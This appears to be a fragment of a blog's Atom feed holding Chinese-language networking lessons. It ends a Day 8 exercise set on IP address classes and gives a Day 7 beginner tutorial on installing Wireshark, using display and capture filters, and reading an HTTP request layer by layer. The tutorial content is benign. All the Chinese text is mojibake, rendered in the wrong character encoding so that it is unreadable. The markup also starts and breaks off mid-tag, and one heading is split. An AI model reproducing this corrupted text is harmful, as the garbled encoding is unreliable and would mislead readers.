é¢˜</h2><ol><li><p>åˆ¤æ–­ä»¥ä¸‹IPåœ°å€çš„ç±»åˆ«å’Œç±»å‹ï¼š</p><ul><li>10.0.0.1</li><li>172.20.1.1</li><li>202.96.209.133</li><li>127.0.0.1</li></ul></li><li><p>å°†ä»¥ä¸‹IPè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼š</p><ul><li>192.168.1.1</li><li>255.255.255.0</li></ul></li><li><p>è®¡ç®—ï¼šAç±»åœ°å€çš„ç½‘ç»œæ•°å’Œæ¯ä¸ªç½‘ç»œçš„ä¸»æœºæ•°</p></li></ol><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šIPåœ°å€æ˜¯äº’è”ç½‘çš„åŸºçŸ³ï¼</p><p>ğŸ‘‰ <a href="../week01/day07.md">ä¸Šä¸€å¤©ï¼šWiresharkæŠ“åŒ…</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day09.md">ä¸‹ä¸€å¤©ï¼šå­ç½‘åˆ’åˆ†å®æˆ˜</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>7å¤©ï¼šWiresharkæŠ“åŒ…å…¥é—¨</title>
    <link href="/2025/11/10/7%E5%A4%A9%EF%BC%9AWireshark%E6%8A%93%E5%8C%85%E5%85%A5%E9%97%A8/"/>
    <url>/2025/11/10/7%E5%A4%A9%EF%BC%9AWireshark%E6%8A%93%E5%8C%85%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬7å¤©ï¼šWiresharkæŠ“åŒ…å…¥é—¨</h1><blockquote><p>â€œçœ‹è§ç½‘ç»œæ•°æ®åŒ…çš„æµåŠ¨ï¼Œå°±åƒçœ‹è§äº†äº’è”ç½‘çš„è¡€æ¶²å¾ªç¯ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>å­¦ä¼šå®‰è£…å’Œä½¿ç”¨Wireshark</li><li>æŒæ¡åŸºæœ¬çš„æŠ“åŒ…å’Œè¿‡æ»¤æŠ€å·§</li><li>èƒ½å¤Ÿåˆ†æHTTPè¯·æ±‚è¿‡ç¨‹</li><li>ç†è§£å„å±‚åè®®åœ¨å®é™…æ•°æ®åŒ…ä¸­çš„å‘ˆç°</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯Wiresharkï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯Wiresharkï¼Ÿ</h2><p><strong>Wireshark</strong>æ˜¯ä¸–ç•Œä¸Šæœ€æµè¡Œçš„ç½‘ç»œåè®®åˆ†æå·¥å…·ï¼ˆä¹Ÿå«æŠ“åŒ…å·¥å…·ï¼‰ã€‚</p><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Wireshark = ç½‘ç»œæ˜¾å¾®é•œ<br><br>å°±åƒåŒ»ç”Ÿç”¨æ˜¾å¾®é•œè§‚å¯Ÿè¡€æ¶²ï¼š<br><span class="hljs-bullet">- </span>çœ‹åˆ°çº¢ç»†èƒã€ç™½ç»†èƒ<br><span class="hljs-bullet">- </span>åˆ†æè¡€æ¶²æˆåˆ†<br><span class="hljs-bullet">- </span>è¯Šæ–­å¥åº·é—®é¢˜<br><br>Wiresharkè®©ä½ çœ‹åˆ°ç½‘ç»œæ•°æ®åŒ…ï¼š<br><span class="hljs-bullet">- </span>çœ‹åˆ°TCPã€HTTPã€DNSåŒ…<br><span class="hljs-bullet">- </span>åˆ†ææ•°æ®å†…å®¹<br><span class="hljs-bullet">- </span>è¯Šæ–­ç½‘ç»œé—®é¢˜<br></code></pre></td></tr></table></figure><h3 id="Wire">Wire</h3><p>sharkçš„ç‰¹ç‚¹</p><ul><li>ğŸ” <strong>å¯è§†åŒ–</strong>ï¼šå›¾å½¢ç•Œé¢ï¼Œæ˜“äºä½¿ç”¨</li><li>ğŸ¨ <strong>å½©è‰²æ˜¾ç¤º</strong>ï¼šä¸åŒåè®®ä¸åŒé¢œè‰²</li><li>ğŸ” <strong>å¼ºå¤§è¿‡æ»¤</strong>ï¼šå¿«é€Ÿæ‰¾åˆ°éœ€è¦çš„åŒ…</li><li>ğŸ“Š <strong>ç»Ÿè®¡åˆ†æ</strong>ï¼šæµé‡ç»Ÿè®¡ã€åè®®åˆ†å¸ƒ</li><li>ğŸ’¾ <strong>ä¿å­˜åˆ†æ</strong>ï¼šå¯ä»¥ä¿å­˜æŠ“åŒ…æ–‡ä»¶</li><li>ğŸŒ <strong>è·¨å¹³å°</strong>ï¼šæ”¯æŒWindowsã€Macã€Linux</li></ul><h2 id="ğŸ”§-å®‰è£…Wireshark">ğŸ”§ å®‰è£…Wireshark</h2><h3 id="ä¸‹è½½">ä¸‹è½½</h3><p>è®¿é—®å®˜ç½‘ï¼š<a href="https://www.wireshark.org/">https://www.wireshark.org/</a></p><h3 id="å„å¹³å°å®‰è£…">å„å¹³å°å®‰è£…</h3><p><strong>Windows</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ä¸‹è½½.exeå®‰è£…åŒ…<br><span class="hljs-bullet">2.</span> åŒå‡»å®‰è£…<br><span class="hljs-bullet">3.</span> å®‰è£…è¿‡ç¨‹ä¸­é€‰æ‹©å®‰è£…WinPcapæˆ–Npcapï¼ˆå¿…éœ€ï¼‰<br><span class="hljs-bullet">4.</span> å®Œæˆåé‡å¯è®¡ç®—æœº<br></code></pre></td></tr></table></figure><p><strong>Mac</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ä¸‹è½½.dmgæ–‡ä»¶<br><span class="hljs-bullet">2.</span> æ‹–åŠ¨åˆ°Applicationsæ–‡ä»¶å¤¹<br><span class="hljs-bullet">3.</span> é¦–æ¬¡è¿è¡Œå¯èƒ½éœ€è¦åœ¨ç³»ç»Ÿåå¥½è®¾ç½®ä¸­å…è®¸<br></code></pre></td></tr></table></figure><p><strong>Linuxï¼ˆUbuntu/Debianï¼‰</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install wireshark<br><br><span class="hljs-comment"># æ·»åŠ å½“å‰ç”¨æˆ·åˆ°wiresharkç»„</span><br><span class="hljs-built_in">sudo</span> usermod -aG wireshark <span class="hljs-variable">$USER</span><br><br><span class="hljs-comment"># é‡æ–°ç™»å½•ç”Ÿæ•ˆ</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ“–-Wiresharkç•Œé¢ä»‹ç»">ğŸ“– Wiresharkç•Œé¢ä»‹ç»</h2><h3 id="ä¸»ç•Œé¢å¸ƒå±€">ä¸»ç•Œé¢å¸ƒå±€</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  èœå•æ : æ–‡ä»¶ ç¼–è¾‘ æŸ¥çœ‹ æ•è· åˆ†æ ç»Ÿè®¡ å¸®åŠ©         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  å·¥å…·æ : [å¼€å§‹] [åœæ­¢] [é‡å¯] [ä¿å­˜] ...                â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  è¿‡æ»¤å™¨: [___________________________] [åº”ç”¨]           â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  â‘  æ•°æ®åŒ…åˆ—è¡¨åŒºï¼ˆPacket Listï¼‰                          â”‚<br>â”‚  No.  Time     Source      Destination  Protocol Info   â”‚<br>â”‚ <span class="hljs-number"> 1 </span>   0.000    192.168.1.1 192.168.1.2  TCP      SYN    â”‚<br>â”‚ <span class="hljs-number"> 2 </span>   0.001    192.168.1.2 192.168.1.1  TCP      ACK    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  â‘¡ æ•°æ®åŒ…è¯¦æƒ…åŒºï¼ˆPacket Detailsï¼‰                       â”‚<br>â”‚  â–¶ Frame 1:<span class="hljs-number"> 74 </span>bytes on wire                            â”‚<br>â”‚  â–¶ Ethernet II, Src: aa:bb:cc:dd:ee:ff                  â”‚<br>â”‚  â–¶ Internet Protocol Version<span class="hljs-number"> 4 </span>                         â”‚<br>â”‚  â–¶ Transmission Control Protocol                        â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  â‘¢ åå…­è¿›åˆ¶æ•°æ®åŒºï¼ˆPacket Bytesï¼‰                       â”‚<br>â”‚ <span class="hljs-number"> 0000 </span><span class="hljs-number"> 00 </span>0c<span class="hljs-number"> 29 </span>6f 6c<span class="hljs-number"> 92 </span>00 0c<span class="hljs-number"> 29 </span>5b 3f e8<span class="hljs-number"> 08 </span>00<span class="hljs-number"> 45 </span>00 â”‚<br>â”‚ <span class="hljs-number"> 0010 </span><span class="hljs-number"> 00 </span>3c f9<span class="hljs-number"> 68 </span>40<span class="hljs-number"> 00 </span>40<span class="hljs-number"> 06 </span>38<span class="hljs-number"> 57 </span>c0 a8<span class="hljs-number"> 01 </span>64 c0 a8 â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="ä¸‰å¤§åŒºåŸŸ">ä¸‰å¤§åŒºåŸŸ</h3><ol><li><strong>æ•°æ®åŒ…åˆ—è¡¨åŒº</strong>ï¼šæ˜¾ç¤ºæ•è·çš„æ‰€æœ‰åŒ…</li><li><strong>æ•°æ®åŒ…è¯¦æƒ…åŒº</strong>ï¼šæ˜¾ç¤ºé€‰ä¸­åŒ…çš„åè®®å±‚æ¬¡ç»“æ„</li><li><strong>åå…­è¿›åˆ¶æ•°æ®åŒº</strong>ï¼šæ˜¾ç¤ºåŸå§‹å­—èŠ‚æ•°æ®</li></ol><h2 id="ğŸ”-å¼€å§‹ç¬¬ä¸€æ¬¡æŠ“åŒ…">ğŸ” å¼€å§‹ç¬¬ä¸€æ¬¡æŠ“åŒ…</h2><h3 id="æ­¥éª¤1ï¼šé€‰æ‹©ç½‘ç»œæ¥å£">æ­¥éª¤1ï¼šé€‰æ‹©ç½‘ç»œæ¥å£</h3><ol><li>å¯åŠ¨Wireshark</li><li>åœ¨ä¸»ç•Œé¢çœ‹åˆ°ç½‘ç»œæ¥å£åˆ—è¡¨</li><li>é€‰æ‹©æ­£åœ¨ä½¿ç”¨çš„æ¥å£ï¼ˆæœ‰æµé‡æ³¢å½¢çš„ï¼‰<ul><li>WiFiï¼šé€šå¸¸æ˜¯ <code>en0</code>ï¼ˆMacï¼‰æˆ– <code>wlan0</code>ï¼ˆLinuxï¼‰</li><li>æœ‰çº¿ï¼šé€šå¸¸æ˜¯ <code>eth0</code> æˆ– <code>en0</code></li></ul></li></ol><h3 id="æ­¥éª¤2ï¼šå¼€å§‹æ•è·">æ­¥éª¤2ï¼šå¼€å§‹æ•è·</h3><p>ç‚¹å‡»æ¥å£åç§°æˆ–ç‚¹å‡»å·¥å…·æ çš„&quot;å¼€å§‹æ•è·&quot;æŒ‰é’®ï¼ˆé²¨é±¼é³å›¾æ ‡ï¼‰</p><h3 id="æ­¥éª¤3ï¼šç”Ÿæˆæµé‡">æ­¥éª¤3ï¼šç”Ÿæˆæµé‡</h3><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®ï¼š<a href="http://www.example.com">http://www.example.com</a></p><h3 id="æ­¥éª¤4ï¼šåœæ­¢æ•è·">æ­¥éª¤4ï¼šåœæ­¢æ•è·</h3><p>ç‚¹å‡»å·¥å…·æ çš„&quot;åœæ­¢æ•è·&quot;æŒ‰é’®ï¼ˆçº¢è‰²æ–¹å—ï¼‰</p><h2 id="ğŸ¨-è®¤è¯†é¢œè‰²ä»£ç ">ğŸ¨ è®¤è¯†é¢œè‰²ä»£ç </h2><p>Wiresharkç”¨é¢œè‰²åŒºåˆ†ä¸åŒç±»å‹çš„åŒ…ï¼š</p><table><thead><tr><th>é¢œè‰²</th><th>åè®®/ç±»å‹</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>æµ…ç´«è‰²</td><td>TCP</td><td>TCPåè®®</td></tr><tr><td>æµ…è“è‰²</td><td>UDP</td><td>UDPåè®®</td></tr><tr><td>é»‘è‰²</td><td>æœ‰é—®é¢˜çš„åŒ…</td><td>æ ¡éªŒå’Œé”™è¯¯ã€é‡ä¼ ç­‰</td></tr><tr><td>æµ…ç»¿è‰²</td><td>HTTP</td><td>HTTPåè®®</td></tr><tr><td>æµ…é»„è‰²</td><td>Windowsç‰¹å®š</td><td>NetBIOSã€SMBç­‰</td></tr><tr><td>æ·±ç°è‰²</td><td>TCPé‡ä¼ </td><td>æ•°æ®åŒ…é‡ä¼ </td></tr></tbody></table><h2 id="ğŸ”-è¿‡æ»¤å™¨ä½¿ç”¨">ğŸ” è¿‡æ»¤å™¨ä½¿ç”¨</h2><h3 id="æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼ˆDisplay-Filterï¼‰">æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼ˆDisplay Filterï¼‰</h3><p><strong>åœ¨å·¥å…·æ çš„è¿‡æ»¤å™¨æ¡†ä¸­è¾“å…¥</strong>ï¼Œç”¨äºè¿‡æ»¤å·²æ•è·çš„åŒ…ã€‚</p><h4 id="å¸¸ç”¨è¿‡æ»¤å™¨">å¸¸ç”¨è¿‡æ»¤å™¨</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># åªæ˜¾ç¤ºHTTP</span><br><span class="hljs-attribute">http</span><br><br><span class="hljs-comment"># åªæ˜¾ç¤ºTCP</span><br>tcp<br><br><span class="hljs-comment"># åªæ˜¾ç¤ºç‰¹å®šIP</span><br>ip.addr == <span class="hljs-number">192.168.1.100</span><br><br><span class="hljs-comment"># åªæ˜¾ç¤ºæºIP</span><br>ip.src == <span class="hljs-number">192.168.1.100</span><br><br><span class="hljs-comment"># åªæ˜¾ç¤ºç›®æ ‡IP</span><br>ip.dst == <span class="hljs-number">8.8.8.8</span><br><br><span class="hljs-comment"># åªæ˜¾ç¤ºç‰¹å®šç«¯å£</span><br>tcp.port == <span class="hljs-number">80</span><br><br><span class="hljs-comment"># ç»„åˆæ¡ä»¶ï¼ˆANDï¼‰</span><br>ip.addr == <span class="hljs-number">192.168.1.100</span> &amp;&amp; tcp.port == <span class="hljs-number">80</span><br><br><span class="hljs-comment"># ç»„åˆæ¡ä»¶ï¼ˆORï¼‰</span><br>http || dns<br><br><span class="hljs-comment"># æ’é™¤ï¼ˆNOTï¼‰</span><br>!arp<br><br><span class="hljs-comment"># HTTP GETè¯·æ±‚</span><br>http.request.method == <span class="hljs-string">&quot;GET&quot;</span><br><br><span class="hljs-comment"># DNSæŸ¥è¯¢</span><br>dns.flags.response == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="æ•è·è¿‡æ»¤å™¨ï¼ˆCapture-Filterï¼‰">æ•è·è¿‡æ»¤å™¨ï¼ˆCapture Filterï¼‰</h3><p><strong>åœ¨å¼€å§‹æ•è·å‰è®¾ç½®</strong>ï¼Œåªæ•è·ç¬¦åˆæ¡ä»¶çš„åŒ…ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># åªæ•è·80ç«¯å£</span><br><span class="hljs-attribute">port</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># åªæ•è·ç‰¹å®šä¸»æœº</span><br><span class="hljs-attribute">host</span> <span class="hljs-number">192.168.1.100</span><br><br><span class="hljs-comment"># åªæ•è·TCP</span><br><span class="hljs-attribute">tcp</span><br><br><span class="hljs-comment"># ç»„åˆæ¡ä»¶</span><br><span class="hljs-attribute">host</span> <span class="hljs-number">192.168.1.100</span> and port <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ”¬-å®æˆ˜ï¼šåˆ†æHTTPè¯·æ±‚">ğŸ”¬ å®æˆ˜ï¼šåˆ†æHTTPè¯·æ±‚</h2><p>è®©æˆ‘ä»¬å®é™…æŠ“å–å¹¶åˆ†æä¸€ä¸ªHTTPè¯·æ±‚ï¼</p><h3 id="æ­¥éª¤1ï¼šè®¾ç½®è¿‡æ»¤å™¨">æ­¥éª¤1ï¼šè®¾ç½®è¿‡æ»¤å™¨</h3><p>åœ¨å¼€å§‹å‰ï¼Œè®¾ç½®æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼š<code>http</code></p><h3 id="æ­¥éª¤2ï¼šå¼€å§‹æ•è·-2">æ­¥éª¤2ï¼šå¼€å§‹æ•è·</h3><p>ç‚¹å‡»å¼€å§‹æŒ‰é’®</p><h3 id="æ­¥éª¤3ï¼šè®¿é—®ç½‘ç«™">æ­¥éª¤3ï¼šè®¿é—®ç½‘ç«™</h3><p>åœ¨æµè§ˆå™¨è®¿é—®ï¼š<a href="http://www.example.com">http://www.example.com</a><br>ï¼ˆæ³¨æ„ï¼šå¿…é¡»æ˜¯httpï¼Œä¸æ˜¯httpsï¼‰</p><h3 id="æ­¥éª¤4ï¼šåœæ­¢å¹¶åˆ†æ">æ­¥éª¤4ï¼šåœæ­¢å¹¶åˆ†æ</h3><p>åœæ­¢æ•è·ï¼Œä½ ä¼šçœ‹åˆ°HTTPè¯·æ±‚å’Œå“åº”ã€‚</p><h3 id="åˆ†æHTTP-GETè¯·æ±‚">åˆ†æHTTP GETè¯·æ±‚</h3><p>æ‰¾åˆ°ä¸€ä¸ªHTTP GETè¯·æ±‚åŒ…ï¼Œç‚¹å‡»å®ƒï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">åœ¨æ•°æ®åŒ…è¯¦æƒ…åŒºï¼Œä½ ä¼šçœ‹åˆ°ï¼š</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">â–¶ Frame 123</span><span class="hljs-punctuation">:</span> <span class="hljs-string">502 bytes on wire</span><br>  <span class="hljs-attribute">â”œâ”€ ç‰©ç†å±‚ä¿¡æ¯</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">â–¶ Ethernet II</span><br><span class="hljs-attribute">  â”œâ”€ Destination</span><span class="hljs-punctuation">:</span> <span class="hljs-string">xx:xx:xx:xx:xx:xx</span><br>  <span class="hljs-attribute">â”œâ”€ Source</span><span class="hljs-punctuation">:</span> <span class="hljs-string">yy:yy:yy:yy:yy:yy</span><br>  <span class="hljs-attribute">â””â”€ Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IPv4 (0x0800)</span><br>    <span class="hljs-comment"># æ•°æ®é“¾è·¯å±‚ï¼šMACåœ°å€</span><br><br><span class="hljs-attribute">â–¶ Internet Protocol Version 4</span><br><span class="hljs-attribute">  â”œâ”€ Source</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.100</span><br>  <span class="hljs-attribute">â”œâ”€ Destination</span><span class="hljs-punctuation">:</span> <span class="hljs-string">93.184.216.34</span><br>  <span class="hljs-attribute">â”œâ”€ Protocol</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCP (6)</span><br>  <span class="hljs-attribute">â””â”€ TTL</span><span class="hljs-punctuation">:</span> <span class="hljs-string">64</span><br>    <span class="hljs-comment"># ç½‘é™…å±‚ï¼šIPåœ°å€</span><br><br><span class="hljs-attribute">â–¶ Transmission Control Protocol</span><br><span class="hljs-attribute">  â”œâ”€ Source Port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">54321</span><br>  <span class="hljs-attribute">â”œâ”€ Destination Port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">80</span><br>  <span class="hljs-attribute">â”œâ”€ Sequence number</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>  <span class="hljs-attribute">â””â”€ Flags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x018 (PSH, ACK)</span><br>    <span class="hljs-comment"># ä¼ è¾“å±‚ï¼šç«¯å£å·</span><br><br><span class="hljs-attribute">â–¶ Hypertext Transfer Protocol</span><br><span class="hljs-attribute">  â”œâ”€ GET / HTTP/1.1\r\n</span><br><span class="hljs-attribute">  â”œâ”€ Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">www.example.com\r\n</span><br>  <span class="hljs-attribute">â”œâ”€ User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0...\r\n</span><br>  <span class="hljs-attribute">â”œâ”€ Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html...\r\n</span><br>  â””â”€ \r\n<br>    <span class="hljs-comment"># åº”ç”¨å±‚ï¼šHTTPåè®®</span><br></code></pre></td></tr></table></figure><p><strong>çœ‹åˆ°äº†ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>âœ… å®Œæ•´çš„TCP/IPå››å±‚ç»“æ„ï¼</li><li>âœ… æ¯ä¸€å±‚çš„å¤´éƒ¨ä¿¡æ¯</li><li>âœ… HTTPè¯·æ±‚çš„å®Œæ•´å†…å®¹</li></ul><h3 id="åˆ†æHTTPå“åº”">åˆ†æHTTPå“åº”</h3><p>æ‰¾åˆ°å¯¹åº”çš„HTTPå“åº”åŒ…ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">â–¶ Hypertext Transfer Protocol<br>  â”œâ”€ HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK\<span class="hljs-attribute">r</span>\n<br>  â”œâ”€ Content-Type: text/html\<span class="hljs-attribute">r</span>\n<br>  â”œâ”€ Content-Length: <span class="hljs-number">1256</span>\<span class="hljs-attribute">r</span>\n<br>  â”œâ”€ Server: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span>\<span class="hljs-attribute">r</span>\n<br>  â””â”€ \<span class="hljs-attribute">r</span>\n<br>  â””â”€ <span class="hljs-selector-attr">[HTML content]</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ’¡-å®ç”¨æŠ€å·§">ğŸ’¡ å®ç”¨æŠ€å·§</h2><h3 id="1-è·Ÿè¸ªTCPæµ">1. è·Ÿè¸ªTCPæµ</h3><p>å³é”®ç‚¹å‡»ä¸€ä¸ªTCPåŒ… â†’ Follow â†’ TCP Stream</p><p><strong>ä½œç”¨</strong>ï¼šæŸ¥çœ‹å®Œæ•´çš„TCPä¼šè¯å†…å®¹ï¼ˆæ‰€æœ‰æ¥å›çš„æ•°æ®ï¼‰</p><h3 id="2-ç»Ÿè®¡ä¿¡æ¯">2. ç»Ÿè®¡ä¿¡æ¯</h3><p>èœå•ï¼šStatistics â†’ Protocol Hierarchy</p><p><strong>ä½œç”¨</strong>ï¼šæŸ¥çœ‹å„ç§åè®®çš„æµé‡å æ¯”</p><h3 id="3-å¯¼å‡ºå¯¹è±¡">3. å¯¼å‡ºå¯¹è±¡</h3><p>èœå•ï¼šFile â†’ Export Objects â†’ HTTP</p><p><strong>ä½œç”¨</strong>ï¼šæå–HTTPä¼ è¾“çš„æ–‡ä»¶ï¼ˆå›¾ç‰‡ã€HTMLç­‰ï¼‰</p><h3 id="4-æ—¶é—´åˆ—æ˜¾ç¤º">4. æ—¶é—´åˆ—æ˜¾ç¤º</h3><p>å³é”®ç‚¹å‡»Timeåˆ— â†’ Display Format â†’ é€‰æ‹©æ ¼å¼</p><p><strong>æ¨è</strong>ï¼šé€‰æ‹©&quot;Seconds Since Previous Displayed Packet&quot;æŸ¥çœ‹åŒ…é—´éš”</p><h3 id="5-æŸ¥æ‰¾åŒ…">5. æŸ¥æ‰¾åŒ…</h3><p>Ctrl+Fï¼ˆWindows/Linuxï¼‰æˆ– Cmd+Fï¼ˆMacï¼‰</p><p>å¯ä»¥æœç´¢ï¼š</p><ul><li>æ˜¾ç¤ºè¿‡æ»¤å™¨</li><li>åå…­è¿›åˆ¶å€¼</li><li>å­—ç¬¦ä¸²</li></ul><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 